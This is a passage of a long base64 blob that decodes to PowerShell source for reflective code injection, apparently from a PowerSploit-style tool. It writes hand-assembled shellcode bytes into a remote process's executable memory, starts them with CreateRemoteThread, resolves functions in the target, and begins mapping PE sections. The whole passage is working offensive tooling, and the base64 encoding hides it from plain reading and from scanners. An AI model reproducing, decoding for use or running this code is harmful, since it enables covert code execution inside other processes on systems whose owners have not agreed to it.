eUFkZHJlc3MgJFNDUFNNZW0KCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJExvYWRMaWJyYXJ5U0MyLkxlbmd0aCkKCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJExvYWRMaWJyYXJ5QUFkZHIsICRTQ1BTTWVtLCAkZmFsc2UpCgkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQoJCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkTG9hZExpYnJhcnlTQzMgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJExvYWRMaWJyYXJ5U0MzLkxlbmd0aCkKCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJExvYWRMaWJyYXJ5QVJldE1lbSwgJFNDUFNNZW0sICRmYWxzZSkKCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCgkJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRMb2FkTGlicmFyeVNDNCAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkTG9hZExpYnJhcnlTQzQuTGVuZ3RoKQoKCQkJCgkJCSRSU0NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50UHRyXVtVSW50NjRdJFNDTGVuZ3RoLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpCgkJCWlmICgkUlNDQWRkciAtZXEgW0ludFB0cl06Olplcm8pCgkJCXsKCQkJCVRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBmb3Igc2hlbGxjb2RlIgoJCQl9CgkJCQoJCQkkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5Xcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUlNDQWRkciwgJFNDUFNNZW1PcmlnaW5hbCwgW1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGgsIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKCQkJaWYgKCgkU3VjY2VzcyAtZXEgJGZhbHNlKSAtb3IgKFtVSW50NjRdJE51bUJ5dGVzV3JpdHRlbiAtbmUgW1VJbnQ2NF0kU0NMZW5ndGgpKQoJCQl7CgkJCQlUaHJvdyAiVW5hYmxlIHRvIHdyaXRlIHNoZWxsY29kZSB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkuIgoJCQl9CgkJCQoJCQkkUlRocmVhZEhhbmRsZSA9IENyZWF0ZS1SZW1vdGVUaHJlYWQgLVByb2Nlc3NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVN0YXJ0QWRkcmVzcyAkUlNDQWRkciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zCgkJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuV2FpdEZvclNpbmdsZU9iamVjdC5JbnZva2UoJFJUaHJlYWRIYW5kbGUsIDIwMDAwKQoJCQlpZiAoJFJlc3VsdCAtbmUgMCkKCQkJewoJCQkJVGhyb3cgIkNhbGwgdG8gQ3JlYXRlUmVtb3RlVGhyZWFkIHRvIGNhbGwgR2V0UHJvY0FkZHJlc3MgZmFpbGVkLiIKCQkJfQoJCQkKCQkJI1RoZSBzaGVsbGNvZGUgd3JpdGVzIHRoZSBETEwgYWRkcmVzcyB0byBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGF0IGFkZHJlc3MgJExvYWRMaWJyYXJ5QVJldE1lbSwgcmVhZCB0aGlzIG1lbW9yeQoJCQlbSW50UHRyXSRSZXR1cm5WYWxNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFB0clNpemUpCgkJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuUmVhZFByb2Nlc3NNZW1vcnkuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkTG9hZExpYnJhcnlBUmV0TWVtLCAkUmV0dXJuVmFsTWVtLCBbVUludFB0cl1bVUludDY0XSRQdHJTaXplLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pCgkJCWlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCgkJCXsKCQkJCVRocm93ICJDYWxsIHRvIFJlYWRQcm9jZXNzTWVtb3J5IGZhaWxlZCIKCQkJfQoJCQlbSW50UHRyXSREbGxBZGRyZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFJldHVyblZhbE1lbSwgW1R5cGVdW0ludFB0cl0pCgoJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRMb2FkTGlicmFyeUFSZXRNZW0sIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCgkJCSRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJTQ0FkZHIsIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCgkJfQoJCWVsc2UKCQl7CgkJCVtJbnRQdHJdJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJExvYWRMaWJyYXJ5QUFkZHIgLUFyZ3VtZW50UHRyICRSSW1wb3J0RGxsUGF0aFB0ciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zCgkJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuV2FpdEZvclNpbmdsZU9iamVjdC5JbnZva2UoJFJUaHJlYWRIYW5kbGUsIDIwMDAwKQoJCQlpZiAoJFJlc3VsdCAtbmUgMCkKCQkJewoJCQkJVGhyb3cgIkNhbGwgdG8gQ3JlYXRlUmVtb3RlVGhyZWFkIHRvIGNhbGwgR2V0UHJvY0FkZHJlc3MgZmFpbGVkLiIKCQkJfQoJCQkKCQkJW0ludDMyXSRFeGl0Q29kZSA9IDAKCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRFeGl0Q29kZVRocmVhZC5JbnZva2UoJFJUaHJlYWRIYW5kbGUsIFtSZWZdJEV4aXRDb2RlKQoJCQlpZiAoKCRSZXN1bHQgLWVxIDApIC1vciAoJEV4aXRDb2RlIC1lcSAwKSkKCQkJewoJCQkJVGhyb3cgIkNhbGwgdG8gR2V0RXhpdENvZGVUaHJlYWQgZmFpbGVkIgoJCQl9CgkJCQoJCQlbSW50UHRyXSREbGxBZGRyZXNzID0gW0ludFB0cl0kRXhpdENvZGUKCQl9CgkJCgkJJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUkltcG9ydERsbFBhdGhQdHIsIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCgkJCgkJcmV0dXJuICREbGxBZGRyZXNzCgl9CgkKCQoJRnVuY3Rpb24gR2V0LVJlbW90ZVByb2NBZGRyZXNzCgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlcihQb3NpdGlvbj0wLCBNYW5kYXRvcnk9JHRydWUpXQoJCVtJbnRQdHJdCgkJJFJlbW90ZVByb2NIYW5kbGUsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbj0xLCBNYW5kYXRvcnk9JHRydWUpXQoJCVtJbnRQdHJdCgkJJFJlbW90ZURsbEhhbmRsZSwKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uPTIsIE1hbmRhdG9yeT0kdHJ1ZSldCgkJW0ludFB0cl0KCQkkRnVuY3Rpb25OYW1lUHRyLCNUaGlzIGNhbiBlaXRoZXIgYmUgYSBwdHIgdG8gYSBzdHJpbmcgd2hpY2ggaXMgdGhlIGZ1bmN0aW9uIG5hbWUsIG9yLCBpZiBMb2FkQnlPcmRpbmFsIGlzICd0cnVlJyB0aGlzIGlzIGFuIG9yZGluYWwgbnVtYmVyIChwb2ludHMgdG8gbm90aGluZykKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0zLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtCb29sXQogICAgICAgICRMb2FkQnlPcmRpbmFsCgkJKQoKCQkkUHRyU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkKCgkJW0ludFB0cl0kUkZ1bmNOYW1lUHRyID0gW0ludFB0cl06Olplcm8gICAjUG9pbnRlciB0byB0aGUgZnVuY3Rpb24gbmFtZSBpbiByZW1vdGUgcHJvY2VzcyBtZW1vcnkgaWYgbG9hZGluZyBieSBmdW5jdGlvbiBuYW1lLCBvcmRpbmFsIG51bWJlciBpZiBsb2FkaW5nIGJ5IG9yZGluYWwKICAgICAgICAjSWYgbm90IGxvYWRpbmcgYnkgb3JkaW5hbCwgd3JpdGUgdGhlIGZ1bmN0aW9uIG5hbWUgdG8gdGhlIHJlbW90ZSBwcm9jZXNzIG1lbW9yeQogICAgICAgIGlmICgtbm90ICRMb2FkQnlPcmRpbmFsKQogICAgICAgIHsKICAgICAgICAJJEZ1bmN0aW9uTmFtZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQW5zaSgkRnVuY3Rpb25OYW1lUHRyKQoKCQkgICAgI1dyaXRlIEZ1bmN0aW9uTmFtZSB0byBtZW1vcnkgKHdpbGwgYmUgdXNlZCBpbiBHZXRQcm9jQWRkcmVzcykKCQkgICAgJEZ1bmN0aW9uTmFtZVNpemUgPSBbVUludFB0cl1bVUludDY0XShbVUludDY0XSRGdW5jdGlvbk5hbWUuTGVuZ3RoICsgMSkKCQkgICAgJFJGdW5jTmFtZVB0ciA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCAkRnVuY3Rpb25OYW1lU2l6ZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSkKCQkgICAgaWYgKCRSRnVuY05hbWVQdHIgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCSAgICB7CgkJCSAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MiCgkJICAgIH0KCgkJICAgIFtVSW50UHRyXSROdW1CeXRlc1dyaXR0ZW4gPSBbVUludFB0cl06Olplcm8KCQkgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJGdW5jTmFtZVB0ciwgJEZ1bmN0aW9uTmFtZVB0ciwgJEZ1bmN0aW9uTmFtZVNpemUsIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKCQkgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCgkJICAgIHsKCQkJICAgIFRocm93ICJVbmFibGUgdG8gd3JpdGUgRExMIHBhdGggdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5IgoJCSAgICB9CgkJICAgIGlmICgkRnVuY3Rpb25OYW1lU2l6ZSAtbmUgJE51bUJ5dGVzV3JpdHRlbikKCQkgICAgewoJCQkgICAgVGhyb3cgIkRpZG4ndCB3cml0ZSB0aGUgZXhwZWN0ZWQgYW1vdW50IG9mIGJ5dGVzIHdoZW4gd3JpdGluZyBhIERMTCBwYXRoIHRvIGxvYWQgdG8gdGhlIHJlbW90ZSBwcm9jZXNzIgoJCSAgICB9CiAgICAgICAgfQogICAgICAgICNJZiBsb2FkaW5nIGJ5IG9yZGluYWwsIGp1c3Qgc2V0IFJGdW5jTmFtZVB0ciB0byBiZSB0aGUgb3JkaW5hbCBudW1iZXIKICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkUkZ1bmNOYW1lUHRyID0gJEZ1bmN0aW9uTmFtZVB0cgogICAgICAgIH0KCQkKCQkjR2V0IGFkZHJlc3Mgb2YgR2V0UHJvY0FkZHJlc3MKCQkkS2VybmVsMzJIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0TW9kdWxlSGFuZGxlLkludm9rZSgia2VybmVsMzIuZGxsIikKCQkkR2V0UHJvY0FkZHJlc3NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJHZXRQcm9jQWRkcmVzcyIpICNLZXJuZWwzMiBsb2FkZWQgdG8gdGhlIHNhbWUgYWRkcmVzcyBmb3IgYWxsIHByb2Nlc3NlcwoKCQkKCQkjQWxsb2NhdGUgbWVtb3J5IGZvciB0aGUgYWRkcmVzcyByZXR1cm5lZCBieSBHZXRQcm9jQWRkcmVzcwoJCSRHZXRQcm9jQWRkcmVzc1JldE1lbSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCBbVUludDY0XVtVSW50NjRdJFB0clNpemUsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9SRUFEV1JJVEUpCgkJaWYgKCRHZXRQcm9jQWRkcmVzc1JldE1lbSAtZXEgW0ludFB0cl06Olplcm8pCgkJewoJCQlUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgZm9yIHRoZSByZXR1cm4gdmFsdWUgb2YgR2V0UHJvY0FkZHJlc3MiCgkJfQoJCQoJCQoJCSNXcml0ZSBTaGVsbGNvZGUgdG8gdGhlIHJlbW90ZSBwcm9jZXNzIHdoaWNoIHdpbGwgY2FsbCBHZXRQcm9jQWRkcmVzcwoJCSNTaGVsbGNvZGU6IEdldFByb2NBZGRyZXNzLmFzbQoJCVtCeXRlW11dJEdldFByb2NBZGRyZXNzU0MgPSBAKCkKCQlpZiAoJFBFSW5mby5QRTY0Qml0IC1lcSAkdHJ1ZSkKCQl7CgkJCSRHZXRQcm9jQWRkcmVzc1NDMSA9IEAoMHg1MywgMHg0OCwgMHg4OSwgMHhlMywgMHg0OCwgMHg4MywgMHhlYywgMHgyMCwgMHg2NiwgMHg4MywgMHhlNCwgMHhjMCwgMHg0OCwgMHhiOSkKCQkJJEdldFByb2NBZGRyZXNzU0MyID0gQCgweDQ4LCAweGJhKQoJCQkkR2V0UHJvY0FkZHJlc3NTQzMgPSBAKDB4NDgsIDB4YjgpCgkJCSRHZXRQcm9jQWRkcmVzc1NDNCA9IEAoMHhmZiwgMHhkMCwgMHg0OCwgMHhiOSkKCQkJJEdldFByb2NBZGRyZXNzU0M1ID0gQCgweDQ4LCAweDg5LCAweDAxLCAweDQ4LCAweDg5LCAweGRjLCAweDViLCAweGMzKQoJCX0KCQllbHNlCgkJewoJCQkkR2V0UHJvY0FkZHJlc3NTQzEgPSBAKDB4NTMsIDB4ODksIDB4ZTMsIDB4ODMsIDB4ZTQsIDB4YzAsIDB4YjgpCgkJCSRHZXRQcm9jQWRkcmVzc1NDMiA9IEAoMHhiOSkKCQkJJEdldFByb2NBZGRyZXNzU0MzID0gQCgweDUxLCAweDUwLCAweGI4KQoJCQkkR2V0UHJvY0FkZHJlc3NTQzQgPSBAKDB4ZmYsIDB4ZDAsIDB4YjkpCgkJCSRHZXRQcm9jQWRkcmVzc1NDNSA9IEAoMHg4OSwgMHgwMSwgMHg4OSwgMHhkYywgMHg1YiwgMHhjMykKCQl9CgkJJFNDTGVuZ3RoID0gJEdldFByb2NBZGRyZXNzU0MxLkxlbmd0aCArICRHZXRQcm9jQWRkcmVzc1NDMi5MZW5ndGggKyAkR2V0UHJvY0FkZHJlc3NTQzMuTGVuZ3RoICsgJEdldFByb2NBZGRyZXNzU0M0Lkxlbmd0aCArICRHZXRQcm9jQWRkcmVzc1NDNS5MZW5ndGggKyAoJFB0clNpemUgKiA0KQoJCSRTQ1BTTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRTQ0xlbmd0aCkKCQkkU0NQU01lbU9yaWdpbmFsID0gJFNDUFNNZW0KCQkKCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzEgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzEuTGVuZ3RoKQoJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRSZW1vdGVEbGxIYW5kbGUsICRTQ1BTTWVtLCAkZmFsc2UpCgkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCgkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJEdldFByb2NBZGRyZXNzU0MyIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCgkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJEdldFByb2NBZGRyZXNzU0MyLkxlbmd0aCkKCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkUkZ1bmNOYW1lUHRyLCAkU0NQU01lbSwgJGZhbHNlKQoJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQoJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRHZXRQcm9jQWRkcmVzc1NDMyAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRHZXRQcm9jQWRkcmVzc1NDMy5MZW5ndGgpCgkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEdldFByb2NBZGRyZXNzQWRkciwgJFNDUFNNZW0sICRmYWxzZSkKCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzQgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzQuTGVuZ3RoKQoJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRHZXRQcm9jQWRkcmVzc1JldE1lbSwgJFNDUFNNZW0sICRmYWxzZSkKCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzUgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzUuTGVuZ3RoKQoJCQoJCSRSU0NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50UHRyXVtVSW50NjRdJFNDTGVuZ3RoLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpCgkJaWYgKCRSU0NBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCVRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBmb3Igc2hlbGxjb2RlIgoJCX0KCQkKCQkkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5Xcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUlNDQWRkciwgJFNDUFNNZW1PcmlnaW5hbCwgW1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGgsIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKCQlpZiAoKCRTdWNjZXNzIC1lcSAkZmFsc2UpIC1vciAoW1VJbnQ2NF0kTnVtQnl0ZXNXcml0dGVuIC1uZSBbVUludDY0XSRTQ0xlbmd0aCkpCgkJewoJCQlUaHJvdyAiVW5hYmxlIHRvIHdyaXRlIHNoZWxsY29kZSB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkuIgoJCX0KCQkKCQkkUlRocmVhZEhhbmRsZSA9IENyZWF0ZS1SZW1vdGVUaHJlYWQgLVByb2Nlc3NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVN0YXJ0QWRkcmVzcyAkUlNDQWRkciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zCgkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5XYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkUlRocmVhZEhhbmRsZSwgMjAwMDApCgkJaWYgKCRSZXN1bHQgLW5lIDApCgkJewoJCQlUaHJvdyAiQ2FsbCB0byBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBHZXRQcm9jQWRkcmVzcyBmYWlsZWQuIgoJCX0KCQkKCQkjVGhlIHByb2Nlc3MgYWRkcmVzcyBpcyB3cml0dGVuIHRvIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgYXQgYWRkcmVzcyAkR2V0UHJvY0FkZHJlc3NSZXRNZW0sIHJlYWQgdGhpcyBtZW1vcnkKCQlbSW50UHRyXSRSZXR1cm5WYWxNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFB0clNpemUpCgkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5SZWFkUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRHZXRQcm9jQWRkcmVzc1JldE1lbSwgJFJldHVyblZhbE1lbSwgW1VJbnRQdHJdW1VJbnQ2NF0kUHRyU2l6ZSwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQoJCWlmICgoJFJlc3VsdCAtZXEgJGZhbHNlKSAtb3IgKCROdW1CeXRlc1dyaXR0ZW4gLWVxIDApKQoJCXsKCQkJVGhyb3cgIkNhbGwgdG8gUmVhZFByb2Nlc3NNZW1vcnkgZmFpbGVkIgoJCX0KCQlbSW50UHRyXSRQcm9jQWRkcmVzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRSZXR1cm5WYWxNZW0sIFtUeXBlXVtJbnRQdHJdKQoKICAgICAgICAjQ2xlYW51cCByZW1vdGUgcHJvY2VzcyBtZW1vcnkKCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAoJCSRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJEdldFByb2NBZGRyZXNzUmV0TWVtLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAoKICAgICAgICBpZiAoLW5vdCAkTG9hZEJ5T3JkaW5hbCkKICAgICAgICB7CiAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJGdW5jTmFtZVB0ciwgW1VJbnRQdHJdW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpIHwgT3V0LU51bGwKICAgICAgICB9CgkJCgkJcmV0dXJuICRQcm9jQWRkcmVzcwoJfQoKCglGdW5jdGlvbiBDb3B5LVNlY3Rpb25zCgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbQnl0ZVtdXQoJCSRQRUJ5dGVzLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N5c3RlbS5PYmplY3RdCgkJJFBFSW5mbywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkZ1bmN0aW9ucywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMlR5cGVzCgkJKQoJCQoJCWZvciggJGkgPSAwOyAkaSAtbHQgJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLkZpbGVIZWFkZXIuTnVtYmVyT2ZTZWN0aW9uczsgJGkrKykKCQl7CgkJCVtJbnRQdHJdJFNlY3Rpb25IZWFkZXJQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uU2VjdGlvbkhlYWRlclB0cikgKCRpICogW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX1NFQ1RJT05fSEVBREVSKSkpCgkJCSRTZWN0aW9uSGVhZGVyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFNlY3Rpb25IZWFkZXJQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX1NFQ1RJT05fSEVBREVSKQoJCQoJCQkjQWRkcmVzcyB0byBjb3B5IHRoZSBzZWN0aW9uIHRvCgkJCVtJbnRQdHJdJFNlY3Rpb25EZXN0QWRkciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kU2VjdGlvbkhlYWRlci5WaXJ0dWFsQWRkcmVzcykpCgkJCQoJCQkjU2l6ZU9mUmF3RGF0YSBpcyB0aGUgc2l6ZSBvZiB0aGUgZGF0YSBvbiBkaXNrLCBWaXJ0